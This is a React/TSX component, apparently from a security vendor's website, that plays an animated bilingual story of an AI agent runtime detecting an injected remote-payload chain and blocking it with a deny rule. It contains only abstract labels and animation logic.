          </g>
          <g className="investigation-desk">
            <path
              className="investigation-desk-top"
              d="M1147 428h201v18h-201z"
            />
            <path
              className="investigation-desk-leg"
              d="M1159 446h14v73h-14zM1321 446h14v73h-14z"
            />
            <path
              className="investigation-console"
              d="M1241 329h108v96h-108z"
            />
            <path className="console-screen" d="M1251 341h88v70h-88z" />
            <g className="review-console-content">
              <g className="review-result intent-result">
                <text x="1295" y="371">
                  REMOTE
                </text>
                <text x="1295" y="393">
                  CODE
                </text>
              </g>
              <g className="review-result trace-result">
                <text x="1295" y="371">
                  CHAIN
                </text>
                <text x="1295" y="393">
                  FOUND
                </text>
              </g>
              <g className="review-result host-result">
                <text x="1295" y="371">
                  HOST
                </text>
                <text x="1295" y="393">
                  ALERT
                </text>
              </g>
              <g className="review-result locked-result">
                <text x="1295" y="369">
                  3 SOURCES
                </text>
                <text x="1295" y="394">
                  LOCKED
                </text>
              </g>
            </g>
          </g>
        </g>
        <SecurityAgent state={l3State} />
      </g>

      <g className={`evidence-layer ${evidenceState}`}>
        <path className="case-route" d="M1135 320h42l18-12h54l18 12h54l18 18" />
        <path className="evidence-focus focus-one" d="M1151 209h52v52h-52z" />
        <path className="evidence-focus focus-two" d="M1223 209h52v52h-52z" />
        <path className="evidence-focus focus-three" d="M1295 209h52v52h-52z" />
      </g>

      <g className={`report-layer ${reportState}`}>
        <path className="report-feed" d="M1295 425v101h-32" />
        <g className="security-report">
          <path className="report-shell" d="M804 530h559v96H804z" />
          <path className="report-paper" d="M817 542h533v72H817z" />
          <text className="report-title" x="831" y="582">
            SECURITY REPORT
          </text>
          <g className="report-finding">
            <path d="M977 548h112v58H977z" />
            <text x="1033" y="568">
              FINDING
            </text>
            <text x="1033" y="593">
              INJECTION
            </text>
          </g>
          <g className="report-evidence">
            <path d="M1099 548h112v58h-112z" />
            <text x="1155" y="568">
              EVIDENCE
            </text>
            <text x="1155" y="593">
              4 / 4
            </text>
          </g>
          <g className="report-risk">
            <path d="M1221 548h116v58h-116z" />
            <text x="1279" y="568">
              RISK
            </text>
            <text x="1279" y="593">
              CRITICAL
            </text>
          </g>
          <path className="report-write" d="M804 530h559v96H804z" />
        </g>
      </g>

      <g className={`gate-layer ${gateState}`}>
        <path className="gate-tower" d="M735 205h95v437h-95z" />
        <path className="gate-window" d="M746 224h73v103h-73z" />
        <path className="gate-slot" d="M752 524h59v83h-59z" />
        <g className="gate-display gate-empty">
          <text x="782" y="263">
            NO RULE
          </text>
          <text x="782" y="293">
            OPEN
          </text>
        </g>
        <g className="gate-display gate-armed">
          <text x="782" y="251">
            R1
          </text>
          <text x="782" y="277">
            ARMED
          </text>
          <text x="782" y="303">
            DENY
          </text>
        </g>
        <g className="gate-display gate-deny">
          <text x="782" y="251">
            R1 MATCH
          </text>
          <text x="782" y="291">
            DENY
          </text>
        </g>
        <g className="gate-card">
          <rect x="759" y="534" width="45" height="63" />
          <text x="781" y="561">
            R1
          </text>
          <text x="781" y="585">
            DENY
          </text>
        </g>
        <g className="gate-slot-doors">
          <path className="slot-door slot-door-left" d="M748 520h34v91h-34z" />
          <path className="slot-door slot-door-right" d="M782 520h34v91h-34z" />
        </g>
        <path
          className="gate-activation-path"
          d="M781 524V327M735 364h95M735 474h95"
        />
        <path className="gate-arm gate-arm-top" d="M724 352h118v25H724z" />
        <path className="gate-arm gate-arm-bottom" d="M724 461h118v25H724z" />
        <g className="gate-barrier">
          <rect
            className="barrier-curtain"
            x="820"
            y="383"
            width="24"
            height="73"
          />
          <path className="barrier-spine" d="M832 383v73" />
          <g className="barrier-segments">
            <rect x="825" y="386" width="14" height="9" />
            <rect x="825" y="401" width="14" height="9" />
            <rect x="825" y="416" width="14" height="9" />
            <rect x="825" y="431" width="14" height="9" />
            <rect x="825" y="446" width="14" height="9" />
          </g>
          <path className="barrier-field" d="M832 389v61" />
        </g>
        <g className="quarantine-chute">
          <path d="M817 469h30l-5 35h-20z" />
          <path
            className="quarantine-teeth"
            d="M821 477h22m-20 8h18m-16 8h14"
          />
        </g>
      </g>

      <g className={`rule-layer ${ruleState}`}>
        <path className="rule-source-rail" d="M1320 520v28h-28" />
        <g className="rule-source-slip">
          <path d="M-25-14h50v28h-50z" />
          <path d="M-16-7h32M-16 0h24M-16 7h18" />
        </g>
        <g className="rule-compiler">
          <path className="compiler-body" d="M967 535h383v91H967z" />
          <path className="compiler-screen" d="M982 548h276v66H982z" />
          <text className="compiler-title" x="995" y="570">
            EXTRACT PATTERN
          </text>
          <g className="compiler-pattern-flow">
            <g className="compiler-node pattern-fetch">
              <rect x="992" y="580" width="66" height="25" />
              <text x="1025" y="597">
                FETCH
              </text>
            </g>
            <path className="compiler-link link-one" d="M1058 592h19" />
            <g className="compiler-node pattern-write">
              <rect x="1077" y="580" width="66" height="25" />
              <text x="1110" y="597">
                WRITE
              </text>
            </g>
            <path className="compiler-link link-two" d="M1143 592h19" />
            <g className="compiler-node pattern-shell">
              <rect x="1162" y="580" width="82" height="25" />
              <text x="1203" y="597">
                SHELL
              </text>
            </g>
          </g>
          <path className="compiler-output" d="M1271 548h64v66h-64z" />
          <g className="compiler-action">
            <text x="1303" y="576">
              R1
            </text>
            <text x="1303" y="600">
              DENY
            </text>
          </g>
          <g className="compiler-core">
            <rect x="1340" y="547" width="6" height="18" />
            <rect x="1340" y="572" width="6" height="18" />
            <rect x="1340" y="597" width="6" height="18" />
          </g>
        </g>
        <path className="rule-belt" d="M842 636h521v19H842z" />
        <g className="rule-cartridge">
          <path d="M-25-18h50v36h-50z" />
          <path
            className="cartridge-teeth"
            d="M-18 18v8m9-8v8m9-8v8m9-8v8m9-8v8"
          />
          <text x="0" y="-1">
            R1
          </text>
          <text x="0" y="14">
            DENY
          </text>
        </g>
      </g>

      <g className={`retry-layer ${retryState}`}>
        <g className="retry-dialog">
          <path d="M444 276h182l14 14v51l-14 14h-47l-15 24-5-24H444l-14-14v-51z" />
          <text x="535" y="321">
            {text.retry}
          </text>
        </g>
        <path className="retry-wire" d="M696 632h66v-213h70" />
        <path className="retry-wire-hot" d="M696 632h66v-213h70" />
        <g className="retry-packet">
          <path d="M0-13 18 0 0 13-18 0z" />
        </g>
        <g className="retry-signature">
          <path className="signature-rail" d="M844 566h306" />
          <text className="signature-title" x="997" y="548">
            R1 CHECK
          </text>
          <g className="signature-node signature-fetch">
            <rect x="850" y="555" width="82" height="34" />
            <text x="891" y="578">
              FETCH
            </text>
          </g>
          <path className="signature-link signature-link-one" d="M932 572h24" />
          <g className="signature-node signature-write">
            <rect x="956" y="555" width="82" height="34" />
            <text x="997" y="578">
              WRITE
            </text>
          </g>
          <path
            className="signature-link signature-link-two"
            d="M1038 572h24"
          />
          <g className="signature-node signature-shell">
            <rect x="1062" y="555" width="82" height="34" />
            <text x="1103" y="578">
              SHELL
            </text>
          </g>
          <text className="signature-match" x="997" y="615">
            3 / 3 MATCH
          </text>
        </g>
        <g className="packet-impact" transform="translate(821 419)">
          <path
            className="impact-compression"
            d="M-24-17 0-9V9l-24 8M2-10h8v20H2z"
          />
          <g className="packet-fragments">
            <rect
              className="fragment fragment-one"
              x="0"
              y="-9"
              width="7"
              height="7"
            />
            <rect
              className="fragment fragment-two"
              x="9"
              y="-3"
              width="6"
              height="6"
            />
            <rect
              className="fragment fragment-three"
              x="1"
              y="7"
              width="6"
              height="6"
            />
            <rect
              className="fragment fragment-four"
              x="13"
              y="9"
              width="5"
              height="5"
            />
          </g>
        </g>
      </g>

      <g className={`finale-layer ${finaleState}`}>
        <rect className="finale-scrim" width="1440" height="810" />
        <image
          className="finale-mark"
          href={withBase('/anysentry-mark-reversed.svg')}
          x="602"
          y="214"
          width="236"
          height="236"
        />
        <image
          className="finale-logo"
          href={withBase('/anysentry-logo-horizontal-reversed.svg')}
          x="570"
          y="465"
          width="300"
          height="75"
        />
        <text className="finale-tagline" x="720" y="594">
          {finaleTagline}
        </text>
      </g>

      <g className={`wipe-curtain ${revealState}`}>
        <rect className="wipe-black" x="38" y="88" width="699" height="603" />
        <path className="wipe-edge" d="M38 96v583" />
      </g>
      <CleanerBot state={revealState} />
    </svg>
  );
}

type AgentRuntimeStoryProps = {
  locale: 'en' | 'zh';
};

const sceneText = {
  zh: {
    scan: '扫描智能体中…',
    implant: '远程载荷植入',
    execute: '执行远程任务',
    retry: '再次执行',
  },
  en: {
    scan: 'SCANNING AGENTS…',
    implant: 'REMOTE PAYLOAD IMPLANT',
    execute: 'EXECUTE REMOTE TASK',
    retry: 'RETRY EXECUTION',
  },
} as const;

const frameCopy = {
  zh: {
    eyebrow: '64 秒运行实录',
    title: '智能体运行时治理实录',
    subtitle: '发现 Agent · 内核取证 · 分层研判 · 执行前治理',
    modeLabel: '观测模式',
    mode: '只读取证',
    durationLabel: '故事时长',
    chapter: '阶段',
    automatic: '进入画面，自动播放',
    running: '正在重建风险链路',
    paused: '离开画面，已自动暂停',
    finished: '治理闭环已完成',
    play: '播放完整故事',
    replay: '从头重播',
    reduced: '已根据系统设置减少角色位移动画，故事内容仍会按顺序呈现。',
    standard: '动画离开画面后自动暂停，回到画面后继续播放。',
  },
  en: {
    eyebrow: 'RUNTIME STORY / AUDIT REPLAY',
    title: 'Agent runtime governance, reconstructed',
    subtitle: 'Discover · Observe · Judge · Govern before execution',
    modeLabel: 'OBSERVATION',
    mode: 'READ ONLY',
    durationLabel: 'DURATION',
    chapter: 'CHAPTER',
    automatic: 'Plays when this frame enters view',
    running: 'Reconstructing the risk chain',
    paused: 'Paused while outside the viewport',
    finished: 'Governance loop complete',
    play: 'Play the full story',
    replay: 'Replay from start',
    reduced:
      'Character travel is reduced by your system preference; the story still advances in sequence.',
    standard:
      'Playback pauses outside the viewport and resumes when you return.',
  },
} as const;

export function AgentRuntimeStory({ locale }: AgentRuntimeStoryProps) {
  const frameRef = useRef<HTMLElement>(null);
  const hasAutoPlayedRef = useRef(false);
  const [isInView, setIsInView] = useState(false);
  const [sceneReady, setSceneReady] = useState(false);
  const reducedMotion = useReducedMotion();
  const playback = usePlayback(isInView);
  const active = getChapterAt(playback.elapsed);
  const labels = frameCopy[locale];

  useEffect(() => {
    const timer = window.setTimeout(() => setSceneReady(true), 0);
    return () => window.clearTimeout(timer);
  }, []);

  const startFromBeginning = useCallback(() => {
    hasAutoPlayedRef.current = true;
    playback.replay();
  }, [playback.replay]);

  useEffect(() => {
    const frame = frameRef.current;
    if (!frame) return;

    if (!('IntersectionObserver' in window)) {
      setIsInView(true);
      if (!hasAutoPlayedRef.current) startFromBeginning();
      return;
    }

    const observer = new IntersectionObserver(
      ([entry]) => {
        const visible = Boolean(entry?.isIntersecting);
        const readyToStart = visible && (entry?.intersectionRatio ?? 0) >= 0.25;
        setIsInView(visible);

        if (readyToStart && !hasAutoPlayedRef.current) {
          startFromBeginning();
        }
      },
      {
        rootMargin: '-8% 0px -8%',
        threshold: [0, 0.25, 0.55],
      },
    );

    observer.observe(frame);
    return () => observer.disconnect();
  }, [startFromBeginning]);

  const playbackState = playback.finished
    ? labels.finished
    : playback.paused
      ? labels.paused
      : playback.started
        ? labels.running
        : labels.automatic;

  return (
    <figure
      ref={frameRef}
      className="as-agent-story"
      data-state={
        playback.finished
          ? 'finished'
          : playback.paused
            ? 'paused'
            : playback.started
              ? 'running'
              : 'idle'
      }
      data-tone={active.chapter.tone}
      aria-label={labels.title}
    >
      <header className="as-agent-story__header">
        <div className="as-agent-story__identity">
          <span className="as-agent-story__mark" aria-hidden="true">
            <img alt="" src={withBase('/anysentry-mark-reversed.svg')} />
          </span>
          <div>
            <span>{labels.eyebrow}</span>
            <strong>{labels.title}</strong>
            <small>{labels.subtitle}</small>
          </div>
        </div>
        <dl className="as-agent-story__meta">
          <div>
            <dt>{labels.modeLabel}</dt>
            <dd>
              <i aria-hidden="true" />
              {labels.mode}
            </dd>
          </div>
          <div>
            <dt>{labels.durationLabel}</dt>
            <dd>{formatDuration(TOTAL_DURATION)}</dd>
          </div>
        </dl>
      </header>

      <div className="as-agent-story__viewport">
        <div
          className={`theatre-screen${playback.started ? ' has-started' : ' is-idle'}${playback.finished ? ' is-finished' : ''}${playback.paused ? ' is-paused' : ''}`}
          data-chapter={active.chapter.key}
          data-reduced-motion={reducedMotion ? 'true' : 'false'}
        >
          {(sceneReady || playback.started) && (
            <div
              className="world-stage"
              data-run={playback.runId}
              key={playback.runId}
              aria-hidden={playback.started ? undefined : true}
            >
              <Scene chapterIndex={active.index} locale={locale} />
              <div className="film-grain" aria-hidden="true" />
              <div className="film-scanlines" aria-hidden="true" />
              <div className="cinema-bars" aria-hidden="true" />
            </div>
          )}

          {!playback.started && (
            <button
              className="as-agent-story__launch"
              type="button"
              onClick={startFromBeginning}
            >
              <Icon name="play" />
              <span>{labels.play}</span>
            </button>
          )}

          {playback.started && (
            <p className="as-sr-only" aria-live="polite" aria-atomic="true">
              {locale === 'zh'
                ? active.chapter.announcement
                : (active.chapter.announcementEn ??
                  active.chapter.announcement)}
            </p>
          )}
        </div>
      </div>

      <figcaption className="as-agent-story__footer">
        <div className="as-agent-story__status">
          <i aria-hidden="true" />
          <span>{playbackState}</span>
        </div>

        <div className="as-agent-story__timeline" aria-hidden="true">
          <span>
            {labels.chapter} {String(active.index + 1).padStart(2, '0')} /{' '}
            {String(CHAPTERS.length).padStart(2, '0')}
          </span>
          <ol>
            {CHAPTERS.map((chapter, index) => (
              <li
                className={
                  index < active.index
                    ? 'is-complete'
                    : index === active.index
                      ? 'is-active'
                      : undefined
                }
                key={chapter.key}
              />
            ))}
          </ol>
          <code>{active.chapter.key.toUpperCase()}</code>
        </div>

        <button
          className="as-agent-story__replay"
          type="button"
          onClick={startFromBeginning}
          disabled={!playback.started}
          aria-label={labels.replay}
        >
          <Icon name="replay" />
          <span>{labels.replay}</span>
        </button>
      </figcaption>

      <p className="as-sr-only">
        {reducedMotion ? labels.reduced : labels.standard}
      </p>
    </figure>
  );
}
